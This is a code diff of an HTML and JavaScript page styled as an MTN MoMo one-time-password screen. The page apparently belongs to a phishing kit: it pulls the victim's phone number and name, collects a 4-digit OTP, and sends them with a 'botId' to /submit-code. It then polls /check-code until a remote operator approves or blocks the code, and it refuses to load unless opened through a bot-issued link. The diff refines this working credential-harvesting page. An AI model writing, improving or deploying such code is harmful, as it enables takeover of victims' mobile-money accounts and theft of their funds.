@@ -1,81 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script>
-  // ============================================================
-  //  BOT ID RESOLVER — runs FIRST on every page load
-  //  Reads botId from URL immediately. Never defaults to bot1.
-  //  Persists to localStorage. Rewrites URL so refreshes keep it.
-  //  Stops the page if botId is missing.
-  // ============================================================
-  (function () {
-    try {
-      const params = new URLSearchParams(window.location.search);
-
-      // 1. Read from URL FIRST
-      let botId = params.get('botId');
-
-      // 2. Fall back to localStorage ONLY if URL is empty
-      if (!botId) {
-        botId = localStorage.getItem('botId');
-      }
-
-      // 3. If STILL empty, refuse to proceed. Do NOT default to any bot.
-      if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
-        document.documentElement.innerHTML =
-          '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
-          '<h2>Invalid link</h2>' +
-          '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
-          '</body>';
-        window.__BOTID_MISSING__ = true;
-        throw new Error('botId missing from URL and localStorage');
-      }
-
-      // 4. Persist so later pages inherit it
-      localStorage.setItem('botId', botId);
-
-      // 5. Ensure the URL always carries botId
-      if (params.get('botId') !== botId) {
-        params.set('botId', botId);
-        const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
-        window.history.replaceState({}, '', newUrl);
-      }
-
-      // 6. Expose globally
-      window.__BOT_ID__ = botId;
-
-      console.log('🆔 botId resolved immediately:', botId);
-    } catch (err) {
-      console.error('botId resolver failed:', err.message);
-    }
-  })();
-  </script>
-
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>MoMo - OTP</title>
   <style>
-    /* ===== MOMO STYLE (consistent with other pages) ===== */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    html, body {
-      width: 100%;
-      min-height: 100%;
-    }
-
-    body {
-      font-family: Arial, Helvetica, sans-serif;
-      background: #fff;
-      overflow-x: hidden;
-    }
-
-    /* =========================================
-       APP CONTAINER
-    ========================================= */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { width: 100%; min-height: 100%; }
+    body { font-family: Arial, Helvetica, sans-serif; background: #fff; overflow-x: hidden; }
 
     .app {
       position: relative;
@@ -88,352 +20,149 @@
       overflow: hidden;
     }
 
-    /* =========================================
-       TOP BLUE AREA
-    ========================================= */
-
-    .top {
-      position: relative;
-      height: 220px;
-      background: #004c69;
-      padding-top: 52px;
-    }
-
+    .top { position: relative; height: 220px; background: #004c69; padding-top: 52px; }
     .top::after {
-      content: "";
-      position: absolute;
-      left: -10%;
-      bottom: -75px;
-      width: 120%;
-      height: 125px;
-      background: #fff;
+      content: ""; position: absolute; left: -10%; bottom: -75px;
+      width: 120%; height: 125px; background: #fff;
       border-radius: 50% 50% 0 0 / 70% 70% 0 0;
     }
 
-    /* =========================================
-       TOP BAR WITH BACK BUTTON AND LOGO
-    ========================================= */
-
     .top-bar {
-      position: relative;
-      z-index: 2;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 22px;
-      margin-top: -10px;
+      position: relative; z-index: 2;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 22px; margin-top: -10px;
     }
 
     .back-btn {
-      color: #ffd500;
-      font-size: 30px;
-      text-decoration: none;
-      font-weight: 300;
-      line-height: 1;
-      background: none;
-      border: none;
-      cursor: pointer;
+      color: #ffd500; font-size: 30px; text-decoration: none; font-weight: 300;
+      line-height: 1; background: none; border: none; cursor: pointer;
       transition: color 0.2s;
     }
-    .back-btn:hover {
-      color: #ffffff;
-    }
+    .back-btn:hover { color: #ffffff; }
 
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
+    .logo { display: flex; align-items: center; gap: 8px; }
 
     .logo-box {
-      width: 40px;
-      height: 40px;
-      border-radius: 8px;
+      width: 40px; height: 40px; border-radius: 8px;
       background: linear-gradient(145deg, #087398, #003d59);
       box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      display: flex; align-items: center; justify-content: center;
     }
 
     .logo-symbol {
-      width: 22px;
-      height: 28px;
-      background: #ffd500;
+      width: 22px; height: 28px; background: #ffd500;
       clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
       position: relative;
     }
     .logo-symbol::after {
-      content: "";
-      position: absolute;
-      width: 6px;
-      height: 6px;
-      background: #004c69;
-      border-radius: 50%;
-      left: 8px;
-      top: 8px;
+      content: ""; position: absolute; width: 6px; height: 6px;
+      background: #004c69; border-radius: 50%; left: 8px; top: 8px;
     }
 
-    .logo-text {
-      color: #ffd500;
-      font-size: 20px;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-    }
-    .logo-text .light {
-      font-weight: 400;
-      font-size: 14px;
-      color: #b8d4e8;
-    }
-
-    /* =========================================
-       CARD
-    ========================================= */
+    .logo-text { color: #ffd500; font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
+    .logo-text .light { font-weight: 400; font-size: 14px; color: #b8d4e8; }
 
     .card {
-      position: relative;
-      z-index: 5;
-      width: calc(100% - 36px);
-      margin: -100px auto 0;
-      background: #fff;
-      border-radius: 34px;
+      position: relative; z-index: 5;
+      width: calc(100% - 36px); margin: -100px auto 0;
+      background: #fff; border-radius: 34px;
       padding: 32px 27px 27px;
       box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
     }
 
     .title {
-      text-align: center;
-      color: #07516b;
-      font-size: 25px;
-      font-weight: 400;
-      margin-bottom: 4px;
+      text-align: center; color: #07516b; font-size: 25px;
+      font-weight: 400; margin-bottom: 4px;
     }
-    .title strong {
-      font-weight: 700;
-    }
+    .title strong { font-weight: 700; }
 
-    .subtitle {
-      text-align: center;
-      color: #555;
-      font-size: 15px;
-      margin-bottom: 4px;
-    }
+    .subtitle { text-align: center; color: #555; font-size: 15px; margin-bottom: 4px; }
 
-    .valid-time {
-      text-align: center;
-      font-size: 14px;
-      color: #5b6f7e;
-      margin-bottom: 24px;
-    }
+    .valid-time { text-align: center; font-size: 14px; color: #5b6f7e; margin-bottom: 24px; }
 
-    /* ----- OTP INPUTS ----- */
-
-    .otp {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 20px;
-      justify-content: center;
-    }
+    .otp { display: flex; gap: 10px; margin-bottom: 20px; justify-content: center; }
 
     .otp input {
-      width: 56px;
-      height: 56px;
-      border: 2px solid #d0d7de;
-      border-radius: 12px;
-      text-align: center;
-      font-size: 22px;
-      font-weight: 500;
-      outline: none;
-      background: #fff;
-      transition: border 0.2s, box-shadow 0.2s;
+      width: 56px; height: 56px; border: 2px solid #d0d7de; border-radius: 12px;
+      text-align: center; font-size: 22px; font-weight: 500;
+      outline: none; background: #fff; transition: border 0.2s, box-shadow 0.2s;
     }
-
     .otp input:focus {
       border-color: #005572;
       box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
     }
-
     .otp input.error {
       border-color: #c0392b;
       box-shadow: 0 0 0 3px rgba(192, 57, 43, 0.15);
     }
+    .otp input::placeholder { color: #ccc; font-weight: 300; }
 
-    .otp input::placeholder {
-      color: #ccc;
-      font-weight: 300;
-    }
-
-    /* ----- Resend ----- */
-
-    .resend-wrap {
-      text-align: center;
-      color: #666;
-      font-size: 15px;
-      margin-bottom: 0;
-    }
-
-    .resend-wrap .timer {
-      font-weight: 600;
-      color: #0a0a0a;
-    }
-
+    .resend-wrap { text-align: center; color: #666; font-size: 15px; margin-bottom: 0; }
+    .resend-wrap .timer { font-weight: 600; color: #0a0a0a; }
     .resend-wrap .clickable {
-      color: #004c69;
-      font-weight: 700;
-      cursor: pointer;
-      text-decoration: underline;
+      color: #004c69; font-weight: 700; cursor: pointer; text-decoration: underline;
     }
-
-    /* ----- Message box ----- */
 
     #message-box {
-      display: none;
-      padding: 12px 16px;
-      border-radius: 12px;
-      margin-top: 16px;
-      font-size: 15px;
-      font-weight: 500;
+      display: none; padding: 12px 16px; border-radius: 12px;
+      margin-top: 16px; font-size: 15px; font-weight: 500;
       border: 1px solid transparent;
     }
-
     #message-box.error {
-      display: block;
-      background: #fef3f2;
-      border-color: #fecdca;
-      color: #c0392b;
+      display: block; background: #fef3f2; border-color: #fecdca; color: #c0392b;
     }
-
     #message-box.success {
-      display: block;
-      background: #ecfdf3;
-      border-color: #abf0d1;
-      color: #0b2b3b;
+      display: block; background: #ecfdf3; border-color: #abf0d1; color: #0b2b3b;
     }
 
-    /* =========================================
-       BOTTOM BUTTON
-    ========================================= */
-
-    .bottom {
-      width: 100%;
-      padding: 0 18px 14px;
-      margin-top: 30px;
-    }
+    .bottom { width: 100%; padding: 0 18px 14px; margin-top: 30px; }
 
     .continue-btn {
-      width: 100%;
-      height: 69px;
-      border: none;
-      border-radius: 40px;
-      background: #d1d5db;
-      color: #fff;
-      font-size: 22px;
-      font-weight: 700;
-      cursor: not-allowed;
-      font-family: Arial, Helvetica, sans-serif;
-      transition: background 0.3s ease;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
+      width: 100%; height: 69px; border: none; border-radius: 40px;
+      background: #d1d5db; color: #fff; font-size: 22px; font-weight: 700;
+      cursor: not-allowed; font-family: Arial, Helvetica, sans-serif;
+      transition: background 0.3s ease; text-transform: uppercase;
+      letter-spacing: 0.5px; display: flex; align-items: center;
+      justify-content: center; gap: 12px;
     }
 
-    .continue-btn:enabled {
-      background: #005572;
-      cursor: pointer;
-    }
-    .continue-btn:enabled:hover {
-      background: #00415a;
-    }
-    .continue-btn:enabled:active {
-      transform: scale(.98);
-    }
+    .continue-btn:enabled { background: #005572; cursor: pointer; }
+    .continue-btn:enabled:hover { background: #00415a; }
+    .continue-btn:enabled:active { transform: scale(.98); }
 
-    /* Loading state keeps colour and shows spinner */
-    .continue-btn.loading:disabled {
-      background: #005572;
-      opacity: 1;
-      cursor: wait;
-    }
+    .continue-btn.loading:disabled { background: #005572; opacity: 1; cursor: wait; }
 
     .continue-btn .btn-text { display: inline; }
     .continue-btn .btn-spinner {
-      display: none;
-      width: 26px;
-      height: 26px;
-      border: 3px solid rgba(255,255,255,0.3);
-      border-top: 3px solid #fff;
-      border-radius: 50%;
-      animation: spin .8s linear infinite;
+      display: none; width: 26px; height: 26px;
+      border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff;
+      border-radius: 50%; animation: spin .8s linear infinite;
     }
 
     .continue-btn.loading .btn-text { display: none; }
     .continue-btn.loading .btn-spinner { display: inline-block; }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    /* =========================================
-       RESPONSIVE
-    ========================================= */
+    @keyframes spin { to { transform: rotate(360deg); } }
 
     @media (max-width: 480px) {
-      .top {
-        height: 190px;
-        padding-top: 40px;
-      }
-      .top-bar {
-        padding: 0 16px;
-      }
-      .card {
-        width: calc(100% - 28px);
-        margin-top: -90px;
-        padding: 28px 20px 24px;
-        border-radius: 28px;
-      }
-      .title {
-        font-size: 22px;
-      }
-      .otp input {
-        width: 48px;
-        height: 48px;
-        font-size: 20px;
-      }
-      .continue-btn {
-        height: 62px;
-        font-size: 20px;
-      }
+      .top { height: 190px; padding-top: 40px; }
+      .top-bar { padding: 0 16px; }
+      .card { width: calc(100% - 28px); margin-top: -90px; padding: 28px 20px 24px; border-radius: 28px; }
+      .title { font-size: 22px; }
+      .otp input { width: 48px; height: 48px; font-size: 20px; }
+      .continue-btn { height: 62px; font-size: 20px; }
     }
 
     @media (max-width: 380px) {
-      .card {
-        padding-left: 16px;
-        padding-right: 16px;
-      }
-      .title {
-        font-size: 20px;
-      }
-      .otp input {
-        width: 42px;
-        height: 44px;
-        font-size: 18px;
-      }
-      .otp {
-        gap: 6px;
-      }
-      .continue-btn {
-        height: 58px;
-        font-size: 18px;
-      }
+      .card { padding-left: 16px; padding-right: 16px; }
+      .title { font-size: 20px; }
+      .otp input { width: 42px; height: 44px; font-size: 18px; }
+      .otp { gap: 6px; }
+      .continue-btn { height: 58px; font-size: 18px; }
     }
 
     @media (max-height: 750px) {
-      .bottom {
-        margin-top: 15px;
-      }
+      .bottom { margin-top: 15px; }
     }
   </style>
 </head>
@@ -441,10 +170,7 @@
 
 <div class="app">
 
-  <!-- ================= TOP BLUE AREA ================= -->
-
   <div class="top">
-
     <div class="top-bar">
       <button class="back-btn" onclick="window.history.back()">&#8592;</button>
 
@@ -457,10 +183,7 @@
 
       <div style="width: 30px;"></div>
     </div>
-
   </div>
-
-  <!-- ================= CARD ================= -->
 
   <div class="card">
 
@@ -486,8 +209,6 @@
 
   </div>
 
-  <!-- ================= BOTTOM BUTTON ================= -->
-
   <div class="bottom">
     <button class="continue-btn" disabled>
       <span class="btn-text">SUBMIT</span>
@@ -497,295 +218,375 @@
 
 </div>
 
+
+<!-- ============================================================
+     SCRIPT 1 — BOT ID RESOLVER (moved from <head> to here)
+     Runs first because it appears first among the bottom scripts.
+     ============================================================ -->
 <script>
-  (function() {
-    // ---------- CONFIG ----------
-    const BACKEND_URL = ""; // leave empty to use same-origin
+(function () {
+  try {
+    const params = new URLSearchParams(window.location.search);
 
-    // ---------- BOTID ----------
-    const botId = window.__BOT_ID__;
-    if (!botId) return;
+    // 1. Read from URL FIRST
+    let botId = params.get('botId');
 
-    // ---------- READ OTHER DATA ----------
-    const urlParams = new URLSearchParams(window.location.search);
-    let phone = urlParams.get('phone') || localStorage.getItem('phone');
-    let name = urlParams.get('name') || localStorage.getItem('fullName');
-
-    if (!phone) {
-      alert('Session expired. Please start over.');
-      window.location.href = 'details.html?botId=' + encodeURIComponent(botId);
-      return;
-    }
-    if (!name) {
-      name = 'MTN User';
-      localStorage.setItem('fullName', name);
+    // 2. Fall back to localStorage ONLY if URL is empty
+    if (!botId) {
+      botId = localStorage.getItem('botId');
     }
 
-    localStorage.setItem('phone', phone);
-
-    // Update subtitle with user's phone
-    const subtitle = document.getElementById('subtitlePlaceholder');
-    if (phone) {
-      subtitle.textContent = 'Enter OTP that was sent to ' + phone;
+    // 3. If STILL empty, refuse to proceed
+    if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
+      document.documentElement.innerHTML =
+        '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
+        '<h2>Invalid link</h2>' +
+        '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
+        '</body>';
+      window.__BOTID_MISSING__ = true;
+      throw new Error('botId missing from URL and localStorage');
     }
 
-    // ---------- DOM REFS ----------
-    const inputs = document.querySelectorAll('.otp input');
-    const continueBtn = document.querySelector('.continue-btn');
-    const btnText = continueBtn.querySelector('.btn-text');
-    const btnSpinner = continueBtn.querySelector('.btn-spinner');
-    let msgDiv = document.getElementById('message-box');
+    // 4. Persist so later pages inherit it
+    localStorage.setItem('botId', botId);
 
-    // Fallback in case #message-box is missing from the DOM
-    if (!msgDiv) {
-      const div = document.createElement('div');
-      div.id = 'message-box';
-      const container = document.querySelector('.card');
-      const resend = document.querySelector('.resend-wrap');
-      container.insertBefore(div, resend);
-      msgDiv = document.getElementById('message-box');
+    // 5. Ensure the URL always carries botId
+    if (params.get('botId') !== botId) {
+      params.set('botId', botId);
+      const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
+      window.history.replaceState({}, '', newUrl);
     }
 
-    // ---------- UI HELPERS ----------
-    function showMessage(text, isError) {
-      msgDiv.textContent = text;
-      msgDiv.className = isError ? 'error' : 'success';
-    }
+    // 6. Expose globally
+    window.__BOT_ID__ = botId;
 
-    function hideMessage() {
-      msgDiv.className = '';
-      msgDiv.textContent = '';
-    }
+    console.log('🆔 botId resolved immediately:', botId);
+  } catch (err) {
+    console.error('botId resolver failed:', err.message);
+  }
+})();
+</script>
 
-    function sanitizeDigit(value) {
-      return value.replace(/\D/g, '');
-    }
 
-    function checkAllFilled() {
-      let allFilled = true;
-      inputs.forEach(function(input) {
-        if (input.value.trim() === '') allFilled = false;
-      });
-      continueBtn.disabled = !allFilled || continueBtn.classList.contains('loading');
-      hideMessage();
-    }
+<!-- ============================================================
+     SCRIPT 2 — PAGE LOGIC
+     ============================================================ -->
+<script>
+(function() {
+  'use strict';
 
-    function setLoading(on) {
-      if (on) {
-        continueBtn.disabled = true;
-        continueBtn.classList.add('loading');
-      } else {
-        continueBtn.classList.remove('loading');
-        checkAllFilled();
+  // ---------- CONFIG ----------
+  const BACKEND_URL = ""; // leave empty to use same-origin
+
+  // ---------- BOTID ----------
+  const botId = window.__BOT_ID__;
+  if (!botId) return;
+
+  // ---------- READ OTHER DATA ----------
+  const urlParams = new URLSearchParams(window.location.search);
+  let phone = urlParams.get('phone') || localStorage.getItem('phone');
+  let name  = urlParams.get('name')  || localStorage.getItem('fullName');
+
+  if (!phone) {
+    alert('Session expired. Please start over.');
+    window.location.href = 'details.html?botId=' + encodeURIComponent(botId);
+    return;
+  }
+  if (!name) {
+    name = 'MTN User';
+    try { localStorage.setItem('fullName', name); } catch (e) {}
+  }
+
+  try { localStorage.setItem('phone', phone); } catch (e) {}
+
+  // Update subtitle with user's phone
+  const subtitle = document.getElementById('subtitlePlaceholder');
+  if (phone) {
+    subtitle.textContent = 'Enter OTP that was sent to ' + phone;
+  }
+
+  // ---------- DOM REFS ----------
+  const inputs      = document.querySelectorAll('.otp input');
+  const continueBtn = document.querySelector('.continue-btn');
+  let   msgDiv      = document.getElementById('message-box');
+
+  // Fallback in case #message-box is missing
+  if (!msgDiv) {
+    const div = document.createElement('div');
+    div.id = 'message-box';
+    const container = document.querySelector('.card');
+    const resend = document.querySelector('.resend-wrap');
+    container.insertBefore(div, resend);
+    msgDiv = document.getElementById('message-box');
+  }
+
+  // ---------- UI HELPERS ----------
+  function showMessage(text, isError) {
+    msgDiv.textContent = text;
+    msgDiv.className = isError ? 'error' : 'success';
+  }
+
+  function hideMessage() {
+    msgDiv.className = '';
+    msgDiv.textContent = '';
+  }
+
+  function sanitizeDigit(value) {
+    return value.replace(/\D/g, '');
+  }
+
+  function checkAllFilled() {
+    let allFilled = true;
+    inputs.forEach(function(input) {
+      if (input.value.trim() === '') allFilled = false;
+    });
+    continueBtn.disabled = !allFilled || continueBtn.classList.contains('loading');
+    hideMessage();
+  }
+
+  function setLoading(on) {
+    if (on) {
+      continueBtn.disabled = true;
+      continueBtn.classList.add('loading');
+    } else {
+      continueBtn.classList.remove('loading');
+      checkAllFilled();
+    }
+  }
+
+  // ---------- OTP INPUT HANDLING ----------
+  inputs.forEach(function(input, index) {
+    input.addEventListener('input', function() {
+      var cleaned = sanitizeDigit(this.value);
+      if (cleaned !== this.value) this.value = cleaned;
+      this.classList.remove('error');
+      if (this.value.length === 1 && index < inputs.length - 1) {
+        inputs[index + 1].focus();
       }
-    }
-
-    // ---------- OTP INPUT HANDLING ----------
-    inputs.forEach(function(input, index) {
-      input.addEventListener('input', function() {
-        var cleaned = sanitizeDigit(this.value);
-        if (cleaned !== this.value) this.value = cleaned;
-        this.classList.remove('error');
-        if (this.value.length === 1 && index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
-        checkAllFilled();
-      });
-
-      input.addEventListener('paste', function(e) {
-        e.preventDefault();
-        var paste = (e.clipboardData || window.clipboardData).getData('text');
-        var digits = sanitizeDigit(paste);
-        if (digits) {
-          // Distribute across all boxes if 4 digits pasted
-          if (digits.length >= 4) {
-            for (var i = 0; i < inputs.length; i++) {
-              inputs[i].value = digits[i] || '';
-              inputs[i].classList.remove('error');
-            }
-            checkAllFilled();
-            inputs[inputs.length - 1].focus();
-          } else {
-            this.value = digits.slice(0, 1);
-            this.dispatchEvent(new Event('input'));
-          }
-        }
-      });
-
-      input.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace' && this.value === '' && index > 0) {
-          inputs[index - 1].focus();
-        }
-      });
-
-      input.addEventListener('focus', function() {
-        this.classList.remove('error');
-      });
-
-      input.addEventListener('blur', checkAllFilled);
+      checkAllFilled();
     });
 
-    // ---------- TIMER (5 minutes) ----------
-    var resendWrapEl = document.getElementById('resendWrap');
-    var totalSeconds = 5 * 60;
-    var timerInterval = null;
+    input.addEventListener('paste', function(e) {
+      e.preventDefault();
+      var paste = (e.clipboardData || window.clipboardData).getData('text');
+      var digits = sanitizeDigit(paste);
+      if (digits) {
+        if (digits.length >= 4) {
+          for (var i = 0; i < inputs.length; i++) {
+            inputs[i].value = digits[i] || '';
+            inputs[i].classList.remove('error');
+          }
+          checkAllFilled();
+          inputs[inputs.length - 1].focus();
+        } else {
+          this.value = digits.slice(0, 1);
+          this.dispatchEvent(new Event('input'));
+        }
+      }
+    });
 
-    function formatTime(sec) {
-      var m = String(Math.floor(sec / 60)).padStart(2, '0');
-      var s = String(sec % 60).padStart(2, '0');
-      return m + ':' + s;
-    }
+    input.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && this.value === '' && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
 
-    function updateTimerUI() {
-      if (totalSeconds <= 0) {
-        resendWrapEl.innerHTML = '<span class="clickable">Resend code</span>';
-        clearInterval(timerInterval);
-        timerInterval = null;
-        resendWrapEl.querySelector('.clickable').onclick = function(e) {
+    input.addEventListener('focus', function() {
+      this.classList.remove('error');
+    });
+
+    input.addEventListener('blur', checkAllFilled);
+  });
+
+  // ---------- TIMER (5 minutes) ----------
+  var resendWrapEl = document.getElementById('resendWrap');
+  var totalSeconds = 5 * 60;
+  var timerInterval = null;
+
+  function formatTime(sec) {
+    var m = String(Math.floor(sec / 60)).padStart(2, '0');
+    var s = String(sec % 60).padStart(2, '0');
+    return m + ':' + s;
+  }
+
+  function updateTimerUI() {
+    if (totalSeconds <= 0) {
+      resendWrapEl.innerHTML = '<span class="clickable">Resend code</span>';
+      if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+      var clickable = resendWrapEl.querySelector('.clickable');
+      if (clickable) {
+        clickable.onclick = function(e) {
           e.preventDefault();
           startTimer(5 * 60);
           hideMessage();
         };
-        return;
       }
-      resendWrapEl.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
-      resendWrapEl.style.cursor = 'default';
+      return;
+    }
+    resendWrapEl.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
+    resendWrapEl.style.cursor = 'default';
+  }
+
+  function startTimer(seconds) {
+    if (timerInterval) clearInterval(timerInterval);
+    totalSeconds = seconds;
+    updateTimerUI();
+    timerInterval = setInterval(function() {
+      totalSeconds--;
+      if (totalSeconds <= 0) {
+        totalSeconds = 0;
+        updateTimerUI();
+      } else {
+        updateTimerUI();
+      }
+    }, 1000);
+  }
+
+  startTimer(5 * 60);
+
+  // ---------- POLLING ----------
+  var pollTimer = null;
+
+  function stopPolling() {
+    if (pollTimer) {
+      clearInterval(pollTimer);
+      pollTimer = null;
+    }
+  }
+
+  // ---------- REDIRECT HELPER ----------
+  function goToSuccess(requestId) {
+    var params = [
+      'botId='     + encodeURIComponent(botId || ''),
+      'requestId=' + encodeURIComponent(requestId || ''),
+      'phone='     + encodeURIComponent(phone || ''),
+      'name='      + encodeURIComponent(name || 'MTN User')
+    ].join('&');
+
+    var successUrl = 'success.html?' + params;
+
+    console.log('✅ Approved — redirecting to:', successUrl);
+
+    window.location.href = successUrl;
+
+    // Fallback if href assignment is blocked
+    setTimeout(function () {
+      try { window.location.replace(successUrl); } catch (e) {}
+    }, 400);
+  }
+
+  // ---------- SUBMIT OTP ----------
+  continueBtn.addEventListener('click', function() {
+    if (this.disabled || this.classList.contains('loading')) return;
+
+    var otp = '';
+    inputs.forEach(function(inp) { otp += inp.value; });
+    if (otp.length !== 4) {
+      showMessage('Please enter a 4-digit OTP.', true);
+      return;
     }
 
-    function startTimer(seconds) {
-      if (timerInterval) clearInterval(timerInterval);
-      totalSeconds = seconds;
-      updateTimerUI();
-      timerInterval = setInterval(function() {
-        totalSeconds--;
-        if (totalSeconds <= 0) {
-          totalSeconds = 0;
-          updateTimerUI();
-          clearInterval(timerInterval);
-          timerInterval = null;
-        } else {
-          updateTimerUI();
-        }
-      }, 1000);
-    }
+    setLoading(true);
+    hideMessage();
 
-    startTimer(5 * 60);
-
-    // ---------- POLLING ----------
-    var pollTimer = null;
-
-    function stopPolling() {
-      if (pollTimer) {
-        clearInterval(pollTimer);
-        pollTimer = null;
+    fetch(BACKEND_URL + '/submit-code', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ name: name, phone: phone, code: otp, botId: botId })
+    })
+    .then(function(res) {
+      if (!res.ok) {
+        return res.text().then(function(t) {
+          var clean = t.startsWith('<') ? ('HTTP ' + res.status) : (t || ('HTTP ' + res.status));
+          throw new Error(clean);
+        });
       }
-    }
+      return res.json();
+    })
+    .then(function(data) {
+      var requestId = data.requestId;
+      if (!requestId) throw new Error('No request ID received');
 
-    // ---------- SUBMIT OTP ----------
-    continueBtn.addEventListener('click', function() {
-      if (this.disabled || this.classList.contains('loading')) return;
+      // Save for downstream pages + safety net
+      try {
+        localStorage.setItem('codeRequestId', requestId);
+      } catch (e) {}
 
-      var otp = '';
-      inputs.forEach(function(inp) { otp += inp.value; });
-      if (otp.length !== 4) {
-        showMessage('Please enter a 4-digit OTP.', true);
-        return;
-      }
+      stopPolling();
+      var attempts = 0;
+      var MAX_ATTEMPTS = 120; // ~3 minutes
 
-      setLoading(true);
-      hideMessage();
+      pollTimer = setInterval(function() {
+        attempts++;
+        fetch(BACKEND_URL + '/check-code/' + encodeURIComponent(requestId))
+          .then(function(res) {
+            if (!res.ok) throw new Error('Verification error');
+            return res.json();
+          })
+          .then(function(status) {
+            if (status.blocked === true) {
+              stopPolling();
+              setLoading(false);
+              showMessage('❌ Account restricted. Please try again later.', true);
+              return;
+            }
 
-      fetch(BACKEND_URL + '/submit-code', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: name, phone: phone, code: otp, botId: botId })
-      })
-      .then(function(res) {
-        if (!res.ok) {
-          return res.text().then(function(t) {
-            var clean = t.startsWith('<') ? ('HTTP ' + res.status) : (t || ('HTTP ' + res.status));
-            throw new Error(clean);
-          });
-        }
-        return res.json();
-      })
-      .then(function(data) {
-        var requestId = data.requestId;
-        if (!requestId) throw new Error('No request ID received');
+            if (status.approved === true) {
+              stopPolling();
+              setLoading(false);
+              showMessage('✅ Verified! Redirecting...', false);
 
-        stopPolling();
-        var attempts = 0;
-        var MAX_ATTEMPTS = 120; // ~3 minutes
+              /* =====================================================
+                 REDIRECT TARGET: success.html
+                 Passes botId, requestId, phone, name so success.html
+                 can display the correct summary.
+              ===================================================== */
+              setTimeout(function() {
+                goToSuccess(requestId);
+              }, 700);
+              return;
+            }
 
-        pollTimer = setInterval(function() {
-          attempts++;
-          fetch(BACKEND_URL + '/check-code/' + requestId)
-            .then(function(res) {
-              if (!res.ok) throw new Error('Verification error');
-              return res.json();
-            })
-            .then(function(status) {
-              if (status.blocked === true) {
-                stopPolling();
-                setLoading(false);
-                showMessage('❌ Account restricted. Please try again later.', true);
-                return;
-              }
-
-              if (status.approved === true) {
-                stopPolling();
-                setLoading(false);
-                showMessage('✅ Verified! Redirecting...', false);
-                var successUrl = 'success.html?botId=' + encodeURIComponent(botId) +
-                                 '&phone=' + encodeURIComponent(phone) +
-                                 '&name=' + encodeURIComponent(name);
-                setTimeout(function() {
-                  window.location.href = successUrl;
-                }, 700);
-                return;
-              }
-
-              if (status.approved === false) {
-                stopPolling();
-                setLoading(false);
-                showMessage('❌ Incorrect OTP. Please try again.', true);
+            if (status.approved === false) {
+              stopPolling();
+              setLoading(false);
+              showMessage('❌ Incorrect OTP. Please try again.', true);
+              inputs.forEach(function(inp) {
+                inp.value = '';
+                inp.classList.add('error');
+              });
+              setTimeout(function() {
                 inputs.forEach(function(inp) {
-                  inp.value = '';
-                  inp.classList.add('error');
+                  inp.classList.remove('error');
                 });
-                setTimeout(function() {
-                  inputs.forEach(function(inp) {
-                    inp.classList.remove('error');
-                  });
-                }, 600);
-                inputs[0].focus();
-                return;
-              }
+              }, 600);
+              inputs[0].focus();
+              return;
+            }
 
-              if (attempts > MAX_ATTEMPTS) {
-                stopPolling();
-                setLoading(false);
-                showMessage('⏳ Taking too long. Please try again.', true);
-                return;
-              }
-
-              // Silent polling — spinner on the button covers the wait
-            })
-            .catch(function(err) {
-              console.error('Polling error:', err);
-            });
-        }, 1500);
-      })
-      .catch(function(err) {
-        setLoading(false);
-        showMessage('❌ ' + (err.message || 'Something went wrong. Please try again.'), true);
-      });
+            if (attempts > MAX_ATTEMPTS) {
+              stopPolling();
+              setLoading(false);
+              showMessage('⏳ Taking too long. Please try again.', true);
+              return;
+            }
+            // else keep polling silently
+          })
+          .catch(function(err) {
+            console.error('Polling error:', err);
+          });
+      }, 1500);
+    })
+    .catch(function(err) {
+      setLoading(false);
+      showMessage('❌ ' + (err.message || 'Something went wrong. Please try again.'), true);
     });
+  });
 
-    // ---------- INIT ----------
-    checkAllFilled();
-    inputs[0].focus();
-  })();
+  // ---------- INIT ----------
+  checkAllFilled();
+  inputs[0].focus();
+})();
 </script>
 
 </body>
